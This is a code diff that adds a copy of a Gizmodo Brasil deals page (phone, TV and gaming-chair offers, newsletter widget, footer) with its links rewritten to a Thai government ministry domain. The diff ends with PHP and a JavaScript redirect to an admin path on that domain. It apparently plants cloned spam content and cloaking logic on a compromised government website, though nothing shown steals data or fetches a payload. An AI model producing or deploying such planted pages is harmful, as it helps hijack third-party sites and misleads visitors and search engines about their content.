+            <a href="https://opsmoacbudget.moac.go.th/ofertas/">
+                💲 Ofertas            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/caixa-amplificada-mondial-connect-power-plus/">
+
+            Caixa Amplificada Mondial Connect Power Plus sai agora 42% OFF
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article></div><div>
+<article class="sup-post-card sup-post-card--oferta " style="">
+
+            <figure class="thumbnail">
+            <a href="https://opsmoacbudget.moac.go.th/mini-projetor-bahrein/">
+                <img width="300" height="180" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Bahrein-HY300-mini-projector--300x180.jpg" class="attachment-medium size-medium wp-post-image" alt="Mini Projetor Bahrein" decoding="async" loading="lazy" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Bahrein-HY300-mini-projector--300x180.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Bahrein-HY300-mini-projector--970x582.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Bahrein-HY300-mini-projector--768x461.jpg 768w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Bahrein-HY300-mini-projector-.jpg 1200w" sizes="auto, (max-width: 300px) 100vw, 300px" />            </a>
+        </figure>
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ofertas/">
+                💲 Ofertas            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/mini-projetor-bahrein/">
+
+            Mini Projetor Bahrein para tela de até 130 polegadas sai 22% OFF
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article></div><div>
+<article class="sup-post-card sup-post-card--oferta " style="">
+
+            <figure class="thumbnail">
+            <a href="https://opsmoacbudget.moac.go.th/samsung-galaxy-s24-fe-256gb/">
+                <img width="300" height="180" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-S24-Fe-300x180.jpg" class="attachment-medium size-medium wp-post-image" alt="Samsung Galaxy S24 FE 256GB" decoding="async" loading="lazy" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-S24-Fe-300x180.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-S24-Fe-970x582.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-S24-Fe-768x461.jpg 768w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-S24-Fe.jpg 1200w" sizes="auto, (max-width: 300px) 100vw, 300px" />            </a>
+        </figure>
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ofertas/">
+                💲 Ofertas            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/samsung-galaxy-s24-fe-256gb/">
+
+            Samsung Galaxy S24 FE 256GB com tela 120Hz sai agora 43% OFF
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article></div><div>
+<article class="sup-post-card sup-post-card--oferta " style="">
+
+            <figure class="thumbnail">
+            <a href="https://opsmoacbudget.moac.go.th/samsung-galaxy-watch-7/">
+                <img width="300" height="180" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-Watch7--300x180.jpg" class="attachment-medium size-medium wp-post-image" alt="Samsung Galaxy Watch 7" decoding="async" loading="lazy" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-Watch7--300x180.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-Watch7--970x582.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-Watch7--768x461.jpg 768w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-Watch7-.jpg 1200w" sizes="auto, (max-width: 300px) 100vw, 300px" />            </a>
+        </figure>
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ofertas/">
+                💲 Ofertas            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/samsung-galaxy-watch-7/">
+
+            Samsung Galaxy Watch 7 com caixa em alumínio reforçado sai 56% OFF
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article></div><div>
+<article class="sup-post-card sup-post-card--oferta " style="">
+
+            <figure class="thumbnail">
+            <a href="https://opsmoacbudget.moac.go.th/realme-c61/">
+                <img width="300" height="180" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Realme-C61-300x180.jpg" class="attachment-medium size-medium wp-post-image" alt="Realme C61" decoding="async" loading="lazy" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Realme-C61-300x180.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Realme-C61-970x582.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Realme-C61-768x461.jpg 768w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Realme-C61.jpg 1200w" sizes="auto, (max-width: 300px) 100vw, 300px" />            </a>
+        </figure>
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ofertas/">
+                💲 Ofertas            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/realme-c61/">
+
+            Realme C61 com tela grande de 6,74 polegadas sai 23% OFF
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article></div><div>
+<article class="sup-post-card sup-post-card--oferta " style="">
+
+            <figure class="thumbnail">
+            <a href="https://opsmoacbudget.moac.go.th/pc-gamer-i5/">
+                <img width="300" height="180" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Pc-Gamer-Completo-I5-300x180.jpg" class="attachment-medium size-medium wp-post-image" alt="PC Gamer i5" decoding="async" loading="lazy" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Pc-Gamer-Completo-I5-300x180.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Pc-Gamer-Completo-I5-970x582.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Pc-Gamer-Completo-I5-768x461.jpg 768w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Pc-Gamer-Completo-I5.jpg 1200w" sizes="auto, (max-width: 300px) 100vw, 300px" />            </a>
+        </figure>
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ofertas/">
+                💲 Ofertas            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/pc-gamer-i5/">
+
+            PC Gamer i5 com 16GB de RAM e monitor LED de 19&#8243; sai 28% OFF
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article></div><div>
+<article class="sup-post-card sup-post-card--oferta " style="">
+
+            <figure class="thumbnail">
+            <a href="https://opsmoacbudget.moac.go.th/motorola-moto-g15-256gb/">
+                <img width="300" height="180" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Motorola-Moto-G15-300x180.jpg" class="attachment-medium size-medium wp-post-image" alt="Motorola Moto G15 256GB" decoding="async" loading="lazy" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Motorola-Moto-G15-300x180.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Motorola-Moto-G15-970x582.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Motorola-Moto-G15-768x461.jpg 768w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Motorola-Moto-G15.jpg 1200w" sizes="auto, (max-width: 300px) 100vw, 300px" />            </a>
+        </figure>
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ofertas/">
+                💲 Ofertas            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/motorola-moto-g15-256gb/">
+
+            Motorola Moto G15 256GB com tela de 1.000 nits sai 12% OFF
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article></div><div>
+<article class="sup-post-card sup-post-card--oferta " style="">
+
+            <figure class="thumbnail">
+            <a href="https://opsmoacbudget.moac.go.th/smart-tv-philco-43-polegadas/">
+                <img width="300" height="180" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Smart-Tv-43-Philco-300x180.jpg" class="attachment-medium size-medium wp-post-image" alt="Smart TV Philco 43 polegadas" decoding="async" loading="lazy" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Smart-Tv-43-Philco-300x180.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Smart-Tv-43-Philco-970x582.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Smart-Tv-43-Philco-768x461.jpg 768w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Smart-Tv-43-Philco.jpg 1200w" sizes="auto, (max-width: 300px) 100vw, 300px" />            </a>
+        </figure>
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ofertas/">
+                💲 Ofertas            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/smart-tv-philco-43-polegadas/">
+
+            Smart TV Philco 43 polegadas com sistema Roku sai agora 26% OFF
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article></div><div>
+<article class="sup-post-card sup-post-card--oferta " style="">
+
+            <figure class="thumbnail">
+            <a href="https://opsmoacbudget.moac.go.th/galaxy-a25-5g-128gb/">
+                <img width="300" height="180" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-A25-5G--300x180.jpg" class="attachment-medium size-medium wp-post-image" alt="Galaxy A25 5G 128GB" decoding="async" loading="lazy" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-A25-5G--300x180.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-A25-5G--970x582.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-A25-5G--768x461.jpg 768w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Galaxy-A25-5G-.jpg 1200w" sizes="auto, (max-width: 300px) 100vw, 300px" />            </a>
+        </figure>
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ofertas/">
+                💲 Ofertas            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/galaxy-a25-5g-128gb/">
+
+            Galaxy A25 5G 128GB com câmera frontal de 13MP sai agora 30% OFF
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article></div><div>
+<article class="sup-post-card sup-post-card--oferta " style="">
+
+            <figure class="thumbnail">
+            <a href="https://opsmoacbudget.moac.go.th/cadeira-gamer-thunderx3/">
+                <img width="300" height="180" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Cadeira-De-Escritorio-Gamer-ThunderX3-300x180.jpg" class="attachment-medium size-medium wp-post-image" alt="Cadeira Gamer ThunderX3" decoding="async" loading="lazy" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Cadeira-De-Escritorio-Gamer-ThunderX3-300x180.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Cadeira-De-Escritorio-Gamer-ThunderX3-970x582.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Cadeira-De-Escritorio-Gamer-ThunderX3-768x461.jpg 768w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Cadeira-De-Escritorio-Gamer-ThunderX3.jpg 1200w" sizes="auto, (max-width: 300px) 100vw, 300px" />            </a>
+        </figure>
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ofertas/">
+                💲 Ofertas            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/cadeira-gamer-thunderx3/">
+
+            Cadeira Gamer ThunderX3 com inclinação de até 135º sai 14% OFF
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article></div>                </div>
+            </div>
+        </div>
+    </div>
+</section><div  class="sup-container sup-publicidade__center"><div class="my-30">    <div id="728x90-parcerias-outras-linguas-2" class="sup-publicidade__wrap">
+    
+            <script>
+                window.uolads.push({
+                    id: "728x90-parcerias-outras-linguas-2"
+                });
+            </script>
+      
+
+
+            <!-- <img src="" alt=""> -->
+
+ 
+    </div>
+
+</div></div>
+
+<section class="sup-newsletter">
+
+
+    <div class="sup-container">
+
+        <h3 class="sup-newsletter__header">
+            fique por dentro </br>das novidades giz <span class="underline">
+
+            </span>
+            <span class="sup-newsletter__subtitle">
+                Inscreva-se agora para receber em primeira mão todas as notícias sobre tecnologia, ciência e cultura, reviews e comparativos exclusivos de produtos, além de descontos imperdíveis em ofertas exclusivas
+            </span>
+        </h3>
+
+
+        <!-- <form>
+            <input type="email" id="email" name="email" placeholder="por favor, digite seu e-mail aqui">
+            <button class="btn-newsletter" type="submit">
+                enviar <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M17.3536 7.35355C17.5488 7.15829 17.5488 6.84171 17.3536 6.64645C17.1583 6.45118 16.8417 6.45118 16.6464 6.64645L17.3536 7.35355ZM7.35355 17.3536L17.3536 7.35355L16.6464 6.64645L6.64645 16.6464L7.35355 17.3536Z" fill="#262626" />
+                    <path d="M7 7H17V17" stroke="#262626" stroke-linejoin="round" />
+                </svg>
+            </button>
+        </form> -->
+
+
+        <div id="custom-substack-embed"></div>
+
+
+     
+
+
+<script>
+  window.CustomSubstackWidget = {
+    substackUrl: "gizbrasil.substack.com",
+    placeholder: "por favor, digite seu e-mail aqui",
+    buttonText: "enviar",
+    theme: "custom",
+    colors: {
+
+        primary: "#FFFFFF",
+      input: "#ffffff",
+      email: "#4D4D4D",
+      text: "#FFFFFF",
+    }
+  };
+</script>
+<script src="https://substackapi.com/widget.js" async></script>
+
+
+
+
+    </div>
+
+
+</section>
+
+</div><!-- #content -->
+
+
+
+
+
+<footer id="colophon" class="sup-footer">
+
+
+	<div class="sup-footer__nav">
+
+		<ul class="sup-nav sup-nav--footer"><li class="sup-nav__item  sup-nav__item--325690"><a href="https://opsmoacbudget.moac.go.th/quem-somos/" class="sup-nav__link">Quem Somos</a></li>
+<li class="sup-nav__item  sup-nav__item--120738"><a href="https://opsmoacbudget.moac.go.th/expediente/" class="sup-nav__link">EXPEDIENTE</a></li>
+<li class="sup-nav__item  sup-nav__item--120744"><a href="https://opsmoacbudget.moac.go.th/mande-sua-dica/" class="sup-nav__link">MANDE SUA DICA</a></li>
+<li class="sup-nav__item  sup-nav__item--276575"><a href="https://opsmoacbudget.moac.go.th/anuncie-aqui/" class="sup-nav__link">Anuncie Aqui</a></li>
+<li class="sup-nav__item  sup-nav__item--530518"><a href="https://opsmoacbudget.moac.go.th/politica-de-afiliados/" class="sup-nav__link">Política de Afiliados</a></li>
+<li class="sup-nav__item  sup-nav__item--430215"><a href="https://opsmoacbudget.moac.go.th/politica-de-privacidade/" class="sup-nav__link">Política de Privacidade</a></li>
+</ul>
+	</div>
+
+	<div class="sup-footer__copy">
+
+		<div class="c-1">
+			2024 © COPYRIGHT - TODOS OS DIREITOS RESERVADOS
+	
+		</div>
+		<div class="c-2">
+			<button onclick="scrollToTop();" class="back-to-top">voltar para o topo</button>
+		</div>
+
+	</div>
+
+
+</footer><!-- #colophon -->
+</div><!-- #page -->
+
+<!-- Instagram Feed JS -->
+<script type="text/javascript">
+var sbiajaxurl = "https://opsmoacbudget.moac.go.th/wp-admin/admin-ajax.php";
+</script>
+		<div class='asp_hidden_data' id="asp_hidden_data" style="display: none !important;">
+			<svg style="position:absolute" height="0" width="0">
+				<filter id="aspblur">
+					<feGaussianBlur in="SourceGraphic" stdDeviation="4"/>
+				</filter>
+			</svg>
+			<svg style="position:absolute" height="0" width="0">
+				<filter id="no_aspblur"></filter>
+			</svg>
+		</div>
+		<script src="https://opsmoacbudget.moac.go.th/wp-content/themes/gizbr_bda8bc8c/assets/dist/js/main.min.js?v1.3.4" id="theme-js"></script>
+
+<script>
+    function scrollToTop() {
+      window.scrollTo({
+        top: 0,
+        behavior: 'smooth'
+      });
+    }
+  </script>
+
+
+<script async>
+	// Seleciona o elemento root do documento
+	const root = document.querySelector(":root");
+	// Define a largura da janela como o valor inicial da variável CSS
+	root.style.setProperty("--window-size", `${window.innerWidth}px`);
+	// Adiciona um event listener para mudanças no tamanho da janela
+	window.addEventListener("resize", () => {
+		// Atualiza o valor da variável CSS com a nova largura da janela
+		root.style.setProperty("--window-size", `${window.innerWidth}px`);
+	});
+</script>
+<script async>
+	// Seleciona o elemento root do documento
+
+
+	const wer = document.querySelector('.sup-offers__content');
+	console.log(wer);
+
+	// Define a largura da janela como o valor inicial da variável CSS
+	root.style.setProperty("--sup-offers", `${wer.clientWidth}px`);
+	// Adiciona um event listener para mudanças no tamanho da janela
+	window.addEventListener("resize", () => {
+		// Atualiza o valor da variável CSS com a nova largura da janela
+		root.style.setProperty("--sup-offers",  `${wer.clientWidth}px`);
+	});
+</script>
+<script id='wd-asp-instances-91a9c11e'>window.ASP_INSTANCES = [];window.ASP_INSTANCES[6] = {"homeurl":"https:\/\/gizmodo.uol.com.br\/","is_results_page":0,"resultstype":"vertical","resultsposition":"hover","resultsSnapTo":"left","results":{"width":"auto","width_tablet":"auto","width_phone":"auto"},"itemscount":4,"charcount":0,"highlight":0,"highlightWholewords":1,"singleHighlight":0,"scrollToResults":{"enabled":0,"offset":0},"autocomplete":{"enabled":1,"trigger_charcount":0,"googleOnly":1,"lang":"en","mobile":1},"trigger":{"delay":300,"autocomplete_delay":310,"update_href":0,"facet":1,"type":1,"click":"ajax_search","click_location":"same","return":"ajax_search","return_location":"same","redirect_url":"?s={phrase}","elementor_url":"https:\/\/gizmodo.uol.com.br\/?asp_ls={phrase}"},"overridewpdefault":1,"override_method":"get","settings":{"unselectChildren":1,"hideChildren":0},"settingsimagepos":"left","settingsVisible":0,"settingsHideOnRes":0,"prescontainerheight":"400px","closeOnDocClick":1,"focusOnPageload":0,"isotopic":{"itemWidth":"200px","itemWidthTablet":"200px","itemWidthPhone":"200px","itemHeight":"200px","itemHeightTablet":"200px","itemHeightPhone":"200px","pagination":1,"rows":2,"gutter":5,"showOverlay":1,"blurOverlay":1,"hideContent":1},"loaderLocation":"auto","show_more":{"enabled":0,"url":"?s={phrase}","elementor_url":"https:\/\/gizmodo.uol.com.br\/?asp_ls={phrase}","action":"ajax","location":"same","infinite":1},"mobile":{"trigger_on_type":1,"click_action":"ajax_search","return_action":"ajax_search","click_action_location":"same","return_action_location":"same","redirect_url":"?s={phrase}","elementor_url":"https:\/\/gizmodo.uol.com.br\/?asp_ls={phrase}","menu_selector":"#menu-toggle","hide_keyboard":0,"force_res_hover":0,"force_sett_hover":0,"force_sett_state":"none"},"compact":{"enabled":0,"focus":1,"width":"100%","width_tablet":"480px","width_phone":"320px","closeOnMagnifier":1,"closeOnDocument":0,"position":"static","overlay":0},"sb":{"redirect_action":"ajax_search","redirect_location":"same","redirect_url":"?s={phrase}","elementor_url":"https:\/\/gizmodo.uol.com.br\/?asp_ls={phrase}"},"rb":{"action":"nothing"},"animations":{"pc":{"settings":{"anim":"fadedrop","dur":300},"results":{"anim":"fadedrop","dur":300},"items":"fadeInDown"},"mob":{"settings":{"anim":"fadedrop","dur":300},"results":{"anim":"fadedrop","dur":300},"items":"voidanim"}},"select2":{"nores":"No results match"},"detectVisibility":0,"autop":{"state":"disabled","phrase":"","count":10},"wooShop":{"useAjax":0,"selector":"#main","url":""},"taxArchive":{"useAjax":0,"selector":"#main","url":""},"cptArchive":{"useAjax":0,"selector":"#main","url":""},"resPage":{"useAjax":0,"selector":"#main","trigger_type":1,"trigger_facet":1,"trigger_magnifier":0,"trigger_return":0},"fss_layout":"flex","scrollBar":{"horizontal":{"enabled":1}},"divi":{"bodycommerce":0},"preventBodyScroll":0,"statistics":0,"preventEvents":0};</script><script type='text/javascript' id='wd-asp-ajaxsearchpro-js-before'>if ( typeof window.ASP == 'undefined') { window.ASP = {wp_rocket_exception: "DOMContentLoaded", ajaxurl: "https:\/\/gizmodo.uol.com.br\/wp-admin\/admin-ajax.php", backend_ajaxurl: "https:\/\/gizmodo.uol.com.br\/wp-admin\/admin-ajax.php", asp_url: "https:\/\/gizmodo.uol.com.br\/wp-content\/plugins\/ajax-search-pro\/", upload_url: "https:\/\/gizmodo.uol.com.br\/wp-content\/blogs.dir\/8\/files\/asp_upload\/", detect_ajax: 1, media_query: "U7NGbF", version: 5065, pageHTML: "", additional_scripts: [{"handle":"wd-asp-ajaxsearchpro","path":"\/var\/www\/gizmodo\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-prereq.js","src":"https:\/\/gizmodo.uol.com.br\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-prereq.js","prereq":[]},{"handle":"wd-asp-ajaxsearchpro-core","path":"\/var\/www\/gizmodo\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-core.js","src":"https:\/\/gizmodo.uol.com.br\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-core.js","prereq":[]},{"handle":"wd-asp-ajaxsearchpro-vertical","path":"\/var\/www\/gizmodo\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-results-vertical.js","src":"https:\/\/gizmodo.uol.com.br\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-results-vertical.js","prereq":["wd-asp-ajaxsearchpro"]},{"handle":"wd-asp-ajaxsearchpro-live","path":"\/var\/www\/gizmodo\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-live.js","src":"https:\/\/gizmodo.uol.com.br\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-live.js","prereq":["wd-asp-ajaxsearchpro"]},{"handle":"wd-asp-ajaxsearchpro-autocomplete","path":"\/var\/www\/gizmodo\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-autocomplete.js","src":"https:\/\/gizmodo.uol.com.br\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-autocomplete.js","prereq":["wd-asp-ajaxsearchpro"]},{"handle":"wd-asp-ajaxsearchpro-load","path":"\/var\/www\/gizmodo\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-load.js","src":"https:\/\/gizmodo.uol.com.br\/wp-content\/plugins\/ajax-search-pro\/js\/min\/plugin\/optimized\/asp-load.js","prereq":["wd-asp-ajaxsearchpro-autocomplete"]}], script_async_load: false, font_url: "https:\/\/gizmodo.uol.com.br\/wp-content\/plugins\/ajax-search-pro\/css\/fonts\/icons\/icons2.woff2", init_only_in_viewport: true, highlight: {"enabled":false,"data":[]}, debug: false, instances: {}, analytics: {"method":"event","tracking_id":"","event":{"focus":{"active":1,"action":"focus","category":"ASP {search_id} | {search_name}","label":"Input focus","value":"1"},"search_start":{"active":0,"action":"search_start","category":"ASP {search_id} | {search_name}","label":"Phrase: {phrase}","value":"1"},"search_end":{"active":1,"action":"search_end","category":"ASP {search_id} | {search_name}","label":"{phrase} | {results_count}","value":"1"},"magnifier":{"active":1,"action":"magnifier","category":"ASP {search_id} | {search_name}","label":"Magnifier clicked","value":"1"},"return":{"active":1,"action":"return","category":"ASP {search_id} | {search_name}","label":"Return button pressed","value":"1"},"try_this":{"active":1,"action":"try_this","category":"ASP {search_id} | {search_name}","label":"Try this click | {phrase}","value":"1"},"facet_change":{"active":0,"action":"facet_change","category":"ASP {search_id} | {search_name}","label":"{option_label} | {option_value}","value":"1"},"result_click":{"active":1,"action":"result_click","category":"ASP {search_id} | {search_name}","label":"{result_title} | {result_url}","value":"1"}}}}};</script><script type='text/javascript' src='https://opsmoacbudget.moac.go.th/wp-content/plugins/ajax-search-pro/js/min/plugin/optimized/asp-prereq.js' id='wd-asp-ajaxsearchpro-js'></script><script type='text/javascript' src='https://opsmoacbudget.moac.go.th/wp-content/plugins/ajax-search-pro/js/min/plugin/optimized/asp-core.js' id='wd-asp-ajaxsearchpro-core-js'></script><script type='text/javascript' src='https://opsmoacbudget.moac.go.th/wp-content/plugins/ajax-search-pro/js/min/plugin/optimized/asp-results-vertical.js' id='wd-asp-ajaxsearchpro-vertical-js'></script><script type='text/javascript' src='https://opsmoacbudget.moac.go.th/wp-content/plugins/ajax-search-pro/js/min/plugin/optimized/asp-live.js' id='wd-asp-ajaxsearchpro-live-js'></script><script type='text/javascript' src='https://opsmoacbudget.moac.go.th/wp-content/plugins/ajax-search-pro/js/min/plugin/optimized/asp-autocomplete.js' id='wd-asp-ajaxsearchpro-autocomplete-js'></script><script type='text/javascript' src='https://opsmoacbudget.moac.go.th/wp-content/plugins/ajax-search-pro/js/min/plugin/optimized/asp-load.js' id='wd-asp-ajaxsearchpro-load-js'></script><script type='text/javascript' src='https://opsmoacbudget.moac.go.th/wp-content/plugins/ajax-search-pro/js/min/plugin/optimized/asp-wrapper.js' id='wd-asp-ajaxsearchpro-wrapper-js'></script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93b7815e5f34f8f4',t:'MTc0NjUyNDMxMy4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+
+</html>
+<?php
+    exit;
+    redirect:
+?>
+<script>
+    window.location.href = 'https://opsmoacbudget.moac.go.th/MBUD-ADMIN/main.php';
+</script>
